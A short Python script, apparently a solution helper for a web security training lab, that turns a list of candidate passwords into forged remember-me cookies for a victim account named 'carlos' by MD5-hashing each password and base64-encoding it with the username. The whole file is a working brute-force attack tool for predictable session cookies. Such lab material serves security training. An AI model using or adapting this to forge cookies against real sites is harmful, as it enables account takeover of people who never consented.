import base64
import hashlib

def encodeB64(str):
    bytes_data = str.encode('utf-8')
    bytes_encoded = base64.b64encode(bytes_data)
    base64_encoded = bytes_encoded.decode('utf-8').strip("=")
    return base64_encoded

def hashMD5(str):
    md5_hash = hashlib.md5(str.encode('utf-8')).hexdigest()
    return md5_hash

def main():
    cands = open("cand.txt", "r").readlines()
    victim = "carlos"
    cookies = open("cookies.txt", "w")
    for cand in cands:
        paswd_hash = hashMD5(cand.strip())
        cookie = encodeB64(f"{victim}:{paswd_hash}")
        cookies.write(f"{cookie} \n")
    cookies.close()

main()
